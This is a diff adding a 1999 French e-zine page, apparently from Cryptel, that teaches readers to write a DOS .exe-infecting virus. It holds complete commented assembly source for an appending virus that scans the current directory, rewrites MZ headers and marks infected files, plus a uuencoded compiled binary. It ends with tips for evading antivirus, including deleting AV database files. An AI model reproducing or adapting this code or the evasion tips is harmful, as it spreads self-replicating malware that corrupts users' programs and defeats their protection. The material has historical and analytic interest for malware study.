@@ -1,0 +1,340 @@
+
+<html>
+<head>
+<title>Enregistrement téléphonique</title>
+</head>
+<body bgcolor="#224016" text="#FFFFFF" link="#CCCCCC" vlink="#CCCCCC" alink="#FF0066" >
+<center>
+<br>
+<table width="600" border="0"><td>
+<p align="left"><a href="badge.htm"><img src="previous.gif" border="0"></a></p></td>
+<td><p align="right"><a href="ft.html"><img src="next.gif" border="0"></a></p></td></table>
+
+<br>
+<table width="600"><td>
+<BR>
+<pre>
+ : ...       .                                                 .       ... :
+  .: : ......:..                                             ..:...... : :.
+  :..: :     :.:...... .    _______                  . ......:.:     : :..:
+    ...:       :           .\ .    \                         :       :...
+    :          :     _____ |  |.    |_____   _____           :          :
+    :         ___ ___( _. \_  ||   _ ( _  \_ ( __/__ ____  __           :
+    :      o |  /_  _. \|  /_ ||   /_ /._ _/_ /__. /_    ||  | _        :
+___ : ____ _\|___l__\|  |   l ||    l__|/   l__ \|  l____||__||_|, ____ : ___
+    :                `--`----'||    .  `-----' `-----'                  :
+    :                      |  ||    |                                   :
+    :          · dz\a! ·   |  |·    |    m a n d r a g o r e !          :
+    :                      |_______/                                    :
+___ : _________________________________________________________________ : ___
+    :                                                                   :
+    :          :                                             :          :
+    :..........:                                             :..........:
+
+</pre>
+<font face="verdana, arial" size="2">
+<h3>Intro</h3>
+<p>
+C'est partit pour un deuxieme article. Je vais essayer de tenir compte des
+(quelques) commentaires que j'ai eu sur le premier article.
+On reste dans le bon esprit; celui de la creation, non de la destruction.
+On va aller un peu plus vite maintenant, et passer à l'infection d'exe dos.
+Je pense que maintenant vous avez les outils, ce sont les m^me que pour
+les .com du premier article (tasm/tlink/soft-ice/hiew/...).
+D'ailleurs je ne reviendrai pas sur les notions de base de cet article.
+
+<h3>Vif du sujet</h3>
+<p>     
+Un exe est consistué de plusieurs parties :<br>
+<ul>- le header (voir detail a la fin)<br>
+- le code<br>
+- les overlays<br></ul>
+<p>
+Ce que nous voulons, c'est rajouter du code a la fin. Il faut donc rediriger
+le pointeur de debut du code vers le notre et changer les infos relatives à
+la taille du fichier dans le header. J'ai marqué d'un * les champs a changer
+dans le header. Pour comprendre l'exe, il faut penser comme l'exe.
+Pour cela, il faut savoir ce k'il se passe quand on l'execute :
+le dos alloue une partie de la memoire pour le loger. Disons que c'est au
+segment 800. CS:IP va pointer à 810h+header[16]:header[14],
+et SS:SP à 810h+header[0eh]]:header[10h]. DS et ES valent 800h.
+Les autres registres sont plus aléatoire...
+Notre action va etre de changer les valeurs dans le header pour pointer vers
+notre code et ensuite revenir au code de l'hote. Il faut aussi changer
+l'adresse de la pile pour nos propres besoins. Finalement, il faut informer
+le header du changement de taille, sinon l'integrite n'est pas respectée.
+L'emplacement du check_sum dans le header nous servira ici a mettre la
+marque de l'infection pour eviter de reinfecter.
+Il faudra aussi re-utiliser la technique du delta offset.
+<p>
+Tout de suite, quelque precautions:<br><ul>
+- tester si l'exe est effectivement dos. (et non win32, NE ou LE)<br>
+- tester si il y a des overlays. (si c'est le cas il vaut mieux aborter)<br>
+- tester si c'est un .com deguisé.<br></ul>
+<p>
+La meilleure explication est, je pense, un source detaillé.
+les commentaires un peu long (notés #x) sont apres pour plus de clarté.
+
+<HR size="1" width=80%>
+<h3>Comment</h3>
+
+<b>        Cryptel 2.0 : mandragore'z code. rip, study, have fun with.</b><br>
+<pre><font size="3">
+*
+
+.model tiny
+.code
+.386
+bptr    equ <byte ptr>          ;  mes chtites preferences.....
+wptr    equ <word ptr>
+        org 0
+Start:
+        ; dummy host
+bov:
+        push cs
+        pop ds          ;  plus pratique :)
+
+        call delta
+delta:  pop bp          ;  le delta offset (voir cryptel 4)
+        sub bp,offset delta
+
+        mov cx,es
+        add cx,10h
+        mov ax,[bp+old_cs]
+        add ax,cx
+        mov [bp+jmp_cs],ax
+        mov ax,[bp+old_ip]      ;  replace les anciennes valeurs de CS, IP,
+        mov [bp+jmp_ip],ax      ;  SS et SP dans la routine de retour
+        mov ax,[bp+old_ss]      ;  maintenant, car elles seront écrasées 
+        add ax,cx               ;  pendant l'infection.
+        mov [bp+org_ss],ax
+        mov ax,[bp+old_sp]
+        mov [bp+org_sp],ax
+
+        mov ah,1ah
+        lea dx,bp+dta   ;  DTA (>cryptel4)
+        int 21h
+
+        mov ah,4eh
+        xor cx,cx
+        lea dx,bp+filtre  ;  on cherche le premier fichier finissant par
+        int 21h           ;   '.exe' dans le repertoire courant
+        jc plus_rien
+try:    call try_inf
+        mov ah,4fh
+        int 21h           ;  on cherche le prochain
+        jnc try
+
+plus_rien:                ;  retour au programme hote
+        push es
+        pop ds
+        jmp $+2         ;  cela rafraichit le buffer du processeur (#1)
+        cli             ;  on desactive les interruptions (#2)
+        push 1234h        ; \
+        org $-2           ;  -> mov ss,...
+org_ss  dw ?              ; /                 
+        pop ss                               ; rien a voir avec les nazis :)
+        mov sp,0
+        org $-2
+org_sp  dw ?
+        sti             ;  on reactive les interruptions
+        db 0eah         ;  jmp far
+jmp_ip  dw 0
+jmp_cs  dw -10h        ;  redirige la 1ere generation sur un RETF (ds le PSP)
+
+try_inf:
+        lea dx,bp+dta+1eh
+        mov ax,3d02h
+        int 21h                 ;  ouverture r/w
+        jc dont_inf             ;  problem ?
+        xchg ax,bx              ;  handle >bx
+        mov ah,3fh
+        mov cx,28
+        lea dx,bp+header
+        mov si,dx
+        int 21h                 ;  lecture du header en memoire
+        mov cx,'ZM'
+        cmp wptr [si],cx        ;  est-ce un vrai .exe ? (signature MZ)
+        je k_exe
+        xchg cl,ch
+        cmp wptr [si],cx        ;  ou ZM
+        jne cloz
+k_exe:  cmp bptr [si+18h],40h   ;  est-ce un exe dos ?
+        je cloz
+        cmp wptr [si+1ah],0     ;  y a t'il des overlays ?
+        jne cloz
+        cmp wptr [si+12h],0deadh ;  deja infecté ?
+        je cloz
+
+        mov ax,4202h
+        xor cx,cx
+        cwd
+        int 21h                 ;  va a la fin du fichier
+        push ax dx              ;  pour recuperer sa taille dans dx:ax
+
+        add ax,eov-bov          ; -  on ajoute la taille du virus
+        adc dx,0                ; /
+        mov cx,512
+        div cx
+        inc ax
+        mov [si+2],dx           ;  on remplace ds le header en memoire
+        mov [si+4],ax
+
+        pop dx ax               ;  pour calculer le nouveau CS:IP, ...
+        shl dx,12               ;  ... on aligne le segment d'entrée et ...
+        push ax
+        shr ax,4                ;  ... on aligne l'offset .
+        add dx,ax
+        pop ax
+        and ax,0fh
+        sub dx,[si+8]           ;  on soustrait la taille du header
+        mov cx,dx
+        xchg [si+16h],cx        ;  on change CS dans le header
+        mov [bp+old_cs],cx      ;  mais on garde le vrai au chaud
+        xchg [si+0eh],dx
+        mov [bp+old_ss],dx      ;     ""    ""   pour SS
+        mov cx,ax
+        xchg [si+14h],cx
+        mov [bp+old_ip],cx      ;     ""    ""   pour IP
+        add ax,eov-bov+40h
+        xchg [si+10h],ax        ;     ""    ""   pour SP
+        mov [bp+old_sp],ax
+
+        mov wptr [si+12h],0deadh ; marque le fichier comme infecté
+
+        mov ah,40h
+        mov cx,eov-bov
+        lea dx,bp+bov
+        int 21h                 ;  ecris le virus a la fin du fichier
+
+        mov ax,4200h
+        xor cx,cx
+        cwd
+        int 21h                 ;  reviens au debut du fichier
+        mov ah,40h
+        mov dx,si
+        mov cx,28               ;  ecris le nouveau header
+        int 21h
+
+cloz:
+        mov ah,3eh
+        int 21h         ;  fermeture du fichier
+dont_inf:
+        ret             ;  retour a la routine de recherche
+
+header  db 28 dup(?)    ;  place reserv‚e pour lire le header
+filtre  db '*.exe',0    ;  hum
+dta     db 30h dup(?)   ;  ......
+old_cs  dw -10h         ; Ä> redirige la 1ere generation sur l'int 20h du PSP
+old_ip  dw 0            ; /
+old_ss  dw 0
+old_sp  dw 0
+sig     db 'Another mandragíre/FS''z production for cryptel',0
+        db '[cryptel 2.0]',0
+
+eov:
+
+end start</font>
+</pre>
+<HR size="1" width="80%"><br>
+<p>
+#1: le processeur possede un cache ou il met d'avance les prochaines
+    instruction. un jmp $+2 lui fait rafraichir, et ainsi il tient
+    compte des modifs 'on the fly'. Les nouveaux processeurs n'ont pas
+    le m^me systeme, mais mieux vaut etre compatible a 100 %
+<p>
+#2: les instructions suivantes modifient l'emplacement de la pile.
+    si jamais le dos lance une interruption a ce moment là, c'est le crash.
+    cli lui dit k'il ne peut pas, et sti le re-autorise.
+<p>
+
+<h3>        Ze end</h3>
+
+<p>
+  Comme l'autre, ce virus est facilement detectable car je l'ai fais le plus
+simple possible. Voici ce que vous pouvez faire de simple pour l'ameliorer :<br><ul>
+-  ne pas mettre '.exe',0 directement, mais qquechose comme '.e_e',0 et
+   remplacer au dernier moment '_' par 'x' (ne pas oublier de remettre apres)<br>
+-  pareil pour la comparaison 'MZ' / 'ZM'<br>
+-  deguiser la routine du delta offset<br>
+-  utiliser du code moins standard pour les interruptions fichier<br>
+-  renommer l'exe qu'on infecte pour qu'un eventuel antivirus en memoire
+   ne detecte rien, l'infecter, et le renommer en .exe<br>
+-  enlever dans le repertoire les fichiers de database anti-virus
+   (anti-vir.dat, chklst.cps, etc, etc...)<br>
+Ceci le rendra deja moins detectable sans se creuser le neurone...
+Mon prochain article (s'il y en a un), portera sur l'un des sujets suivants:
+les techniques avancées, les residents memoires ou l'infection d'exe win32.
+Pour des choses plus avancées tt de suite, lisez le zine de mon ex-group DDT
+ à www.multimania.com/mdrg/ddt-1.zip<br><br>
+<p>
+Ecrivez moi, ou ecrivez a cryptel, pour influencer le choix du prochain sujet
+ ou si vous voulez des complements d'information, et blabla et blabla.....
+<p>
+                          <center>            >  <a href="mailto:mandragore@coderz.net">mandragore@coderz.net</a></center>
+
+
+
+
+<ul><h3>          APPENDIX</h3></ul>
+
+<p>
+Description du header:
+<pre><font size="3">
+offset de depart        description
+0                       'MZ' ou 'ZM' (si c'est bien un EXE)
+2  *                    reste de la division  V
+4  *                    taille du fichier / 512
+6                       nombre de relocation a la fin du header
+8                       taille du header / 20
+0a                      taille minimum de memoire requise (pas tjs utilisé)
+0c                      taille maximum utilisé (rarement utilisé)
+0e *                    SS / 16 (stack segment)
+10 *                    SP (stack pointer)
+12 ?                    checksum (inutile, donc utile pour nous)
+14 *                    point d'entrée du proggy (IP)
+16 *                    CS / 16 (code segment)
+18                      adresse de la premiere relocation
+1A                      taille des overlays</font>
+</pre><p>
+hiew decortique tres bien les headers si vous avez du mal au debut...
+(mode hexa / F8)
+
+<p>
+version deja compilee et marquée comme infectée.
+<pre><font size="3">
+begin 644 CRYPT2.EXE
+M35JO`0(````@``$`__\`````K=X`````/@````$`^S!J<@``````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M```````````````````````.'^@``%V![04`C,&#P1"+AFH!`\&)AF``BX9L
+M`8F&7@"+AFX!`\&)AE8`BX9P`8F&6@"T&HV6.@'-(;1.,\F-EC0!S2%R">@8
+M`+1/S2%S]P8?ZP#Z:#02%[P``/OJ``#P_XV66`&X`CW-(0^"J`"3M#^Y'`"-
+MEA@!B_+-(;E-6CD,=`B&S3D,#X6'`(!\&$`/A'\`@WP:`'5Y@7P2K=YT<K@"
+M0C/)F<TA4%(%KP&#T@"Y``+W\4")5`*)1`1:6,'B#%#!Z`0#T%@E#P`K5`B+
+MRH=,%HF.:@&'5`Z)EFX!B\B'3!2)CFP!!>\!AT00B89P`<=$$JW>M$"YKP&-
+ME@``S2&X`$(SR9G-(;1`B]:Y'`#-(;0^S2'#````````````````````````
+M`````````````"HN97AE````````````````````````````````````````
+M`````````````````````````/#_````````06YO=&AE<B!M86YD<F%G[7)E
+K+T93)WH@<')O9'5C=&EO;B!F;W(@8W)Y<'1E;`!;8W)Y<'1E;"`R+C!=````
+`
+end</font>
+</pre>
+<br></td></table>
+<table width="600" border="0"><td>
+<p align="left"><a href="badge.htm"><img src="previous.gif" border="0"></a></p></td>
+<td><p align="right"><a href="ft.html"><img src="next.gif" border="0"></a></p></td></table>
+
+<br><table width=600>
+<hr width="80%" size="2"><br><font face="verdana" size="2">
+CRYPTEL 1999: Distribution autorisée et conseillée d'ailleurs !
+Citez juste les AUTEURS et les SOURCES par simple politesse :)<br><br></font>
+<hr width="80%" size="2"><br></table></center></BODY></HTML>
